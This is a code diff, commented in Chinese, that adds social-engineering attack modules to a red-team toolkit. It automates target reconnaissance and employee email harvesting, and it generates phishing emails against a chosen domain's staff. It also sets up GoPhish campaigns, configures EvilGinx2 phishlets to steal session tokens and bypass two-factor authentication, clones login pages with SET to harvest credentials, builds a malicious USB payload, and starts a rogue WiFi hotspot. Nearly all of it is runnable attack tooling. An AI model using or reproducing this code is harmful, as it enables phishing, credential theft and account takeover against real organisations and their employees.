@@ -93,6 +93,11 @@ class RedTeamToolkit:
         s.creds = CredHarvest(kb)
         s.c2 = C2Integration(kb)
         s.persist = Persistence(kb)
+        # 社工增强
+        s.osint = OSINTRecon(kb)
+        s.gophish = GoPhishManager(kb)
+        s.evilginx = EvilGinxManager(kb)
+        s.set = SETManager(kb)
 
     def hw_chain(s, subnet, dc="", domain="", user="", pw=""):
         """HW一条龙: 扫描→喷洒→横向→域控"""
@@ -104,3 +109,163 @@ class RedTeamToolkit:
             if dc and domain:
                 r.append(("Kerberoast", s.ad.kerberoast(dc, domain, user, pw)))
         return r
+
+    def social_engineering_chain(s, target_domain, company_name=""):
+        """社工一条龙: 信息收集→邮箱列表→钓鱼模板→部署"""
+        r = []
+        # Step 1: 收集目标信息
+        r.append(("信息收集", s.osint.theharvester(target_domain)))
+        r.append(("WHOIS", s.osint.whois_info(target_domain)))
+        r.append(("DNS", s.osint.dns_enum(target_domain)))
+        # Step 2: 生成钓鱼材料
+        company = company_name or target_domain.split(".")[0]
+        r.append(("邮件模板_密码", s.phish.generate_email(f"hr@{target_domain}", "HR", company, "password_reset")))
+        r.append(("邮件模板_文档", s.phish.generate_email(f"all@{target_domain}", "全员", company, "document")))
+        r.append(("邮件模板_安全", s.phish.generate_email(f"admin@{target_domain}", "IT", company, "security")))
+        # Step 3: GitHub dork
+        r.append(("GitHub泄露", s.osint.github_dorks(target_domain.split(".")[0])))
+        return r
+
+
+
+# ═══════════════════════════════════════════════════════════
+# 社工增强模块 — GoPhish / theHarvester / EvilGinx2 / SET
+# ═══════════════════════════════════════════════════════════
+
+class OSINTRecon:
+    """开源情报收集 — 目标人员/邮箱/组织信息"""
+    def __init__(s, kb): s.kb = kb
+
+    def theharvester(s, domain, sources="bing,google,linkedin,dnsdumpster"):
+        """theHarvester: 收集邮箱/子域/员工姓名"""
+        return s.kb.run(f"theHarvester -d {domain} -b {sources} -l 200 2>&1|tail -60", timeout=180)
+
+    def linkedin_users(s, company):
+        """从LinkedIn搜索目标公司员工（需搭配代理）"""
+        return s.kb.run(f"theHarvester -d {company} -b linkedin -l 100 2>&1|grep '@'|head -30", timeout=120)
+
+    def email_format(s, domain):
+        """猜测邮箱格式: first.last / f.last / firstlast"""
+        return s.kb.run(f"theHarvester -d {domain} -b bing,google -l 50 2>&1|grep '@{domain}'|head -20", timeout=60)
+
+    def hunter_io(s, domain, api_key=""):
+        """Hunter.io API 查邮箱（需要 API Key）"""
+        if not api_key: return {"error": "需要 HUNTER_IO_API_KEY"}
+        return s.kb.run(f"curl -s 'https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}'|python3 -m json.tool|head -50", timeout=15)
+
+    def github_dorks(s, org):
+        """GitHub Dork: 找组织泄露的密码/密钥/配置"""
+        dorks = [
+            f'org:{org} password', f'org:{org} secret', f'org:{org} api_key',
+            f'org:{org} token', f'org:{org} jdbc', f'org:{org} smtp',
+        ]
+        return {"dorks": dorks, "note": "手动在 GitHub 搜索以上关键词"}
+
+    def whois_info(s, domain):
+        return s.kb.run(f"whois {domain}|grep -i 'name\\|email\\|phone\\|org'|head -15", timeout=15)
+
+    def dns_enum(s, domain):
+        return s.kb.run(f"dig {domain} any +short && dig {domain} mx +short && dig {domain} txt +short", timeout=15)
+
+
+class GoPhishManager:
+    """GoPhish 钓鱼平台管理"""
+    def __init__(s, kb): s.kb = kb
+
+    def install(s):
+        """安装 GoPhish 到 Kali"""
+        return s.kb.run(
+            "cd /opt && wget -q https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip "
+            "&& unzip -oq gophish-*.zip -d gophish && chmod +x /opt/gophish/gophish && echo OK",
+            timeout=120
+        )
+
+    def start(s, listen_url="0.0.0.0:3333"):
+        """启动 GoPhish（后台运行）"""
+        return s.kb.run(f"cd /opt/gophish && nohup ./gophish > /tmp/gophish.log 2>&1 &; sleep 3 && cat /tmp/gophish.log|grep password|head -3", timeout=15)
+
+    def status(s):
+        """检查 GoPhish 是否运行"""
+        return s.kb.run("curl -sk https://localhost:3333/api/ 2>&1|head -5", timeout=10)
+
+    def create_campaign_guide(s, target_domain, from_email, landing_page):
+        """生成创建 campaign 的步骤指南"""
+        return {
+            "steps": [
+                f"1. 访问 https://Kali-IP:3333 登录 GoPhish 管理面板",
+                f"2. Sending Profile: SMTP 配置（用你的邮件服务器）",
+                f"3. Landing Page: 导入 {landing_page} (克隆的登录页)",
+                f"4. Email Template: 使用 rt.phish.generate_email() 生成的模板",
+                f"5. Users & Groups: 导入从 theHarvester 收集的邮箱列表",
+                f"6. Campaign: 组合以上配置，设定发送时间",
+                f"7. 查看 Dashboard: 谁打开了/谁点了链接/谁输了密码",
+            ],
+            "api_example": f"curl -sk https://localhost:3333/api/campaigns -H 'Authorization: Bearer API_KEY'",
+        }
+
+
+class EvilGinxManager:
+    """EvilGinx2 — 中间人钓鱼（绕过2FA！）"""
+    def __init__(s, kb): s.kb = kb
+
+    def install(s):
+        """安装 EvilGinx2"""
+        return s.kb.run(
+            "go install github.com/kgretzky/evilginx2@latest 2>&1|tail -5",
+            timeout=180
+        )
+
+    def setup_phishlet(s, phishlet, domain, redirect_url):
+        """配置一个 phishlet（如 outlook365、google 等）
+        phishlet: o365 / google / linkedin / github
+        domain: 你控制的钓鱼域名
+        """
+        cmds = [
+            f"config domain {domain}",
+            f"config ipv4 $(curl -s ifconfig.me)",
+            f"phishlets hostname {phishlet} {phishlet}.{domain}",
+            f"phishlets enable {phishlet}",
+            f"lures create {phishlet}",
+            f"lures edit 0 redirect_url {redirect_url}",
+            f"lures get-url 0",
+        ]
+        return {
+            "commands": cmds,
+            "run_command": f"evilginx2 -p /opt/evilginx2/phishlets",
+            "note": "EvilGinx2 需要一个域名指向你的服务器 + 配置DNS",
+            "支持的phishlet": ["o365", "google", "linkedin", "github", "okta", "onelogin"],
+            "效果": "受害者在你的页面登录 → 你拿到完整 session token（绕过2FA）",
+        }
+
+    def list_phishlets(s):
+        return s.kb.run("ls /opt/evilginx2/phishlets/ 2>/dev/null || ls ~/go/bin/phishlets/ 2>/dev/null", timeout=5)
+
+
+class SETManager:
+    """Social Engineering Toolkit (SET) — Kali 自带"""
+    def __init__(s, kb): s.kb = kb
+
+    def credential_harvester(s, clone_url):
+        """SET 凭证收割: 克隆目标登录页，受害者输密码你收到"""
+        return s.kb.run(
+            f"setoolkit <<< $'1\\n2\\n3\\n2\\n{clone_url}\\n' 2>&1|tail -20",
+            timeout=30
+        )
+
+    def infectious_media(s, lhost, lport=4444):
+        """SET 生成恶意USB payload"""
+        return s.kb.run(
+            f"setoolkit <<< $'1\\n3\\n1\\n{lhost}\\n{lport}\\n' 2>&1|tail -20",
+            timeout=30
+        )
+
+    def qr_attack(s, url):
+        """生成恶意二维码"""
+        return s.kb.run(f"qrencode -o /tmp/evil_qr.png '{url}' && echo 'QR saved: /tmp/evil_qr.png'", timeout=10)
+
+    def wifi_ap(s, interface="wlan0", ssid="Free_WiFi"):
+        """创建钓鱼 WiFi 热点（需要无线网卡）"""
+        return s.kb.run(
+            f"airbase-ng -e '{ssid}' -c 6 {interface} 2>&1 &; sleep 3 && echo 'AP started: {ssid}'",
+            timeout=15
+        )
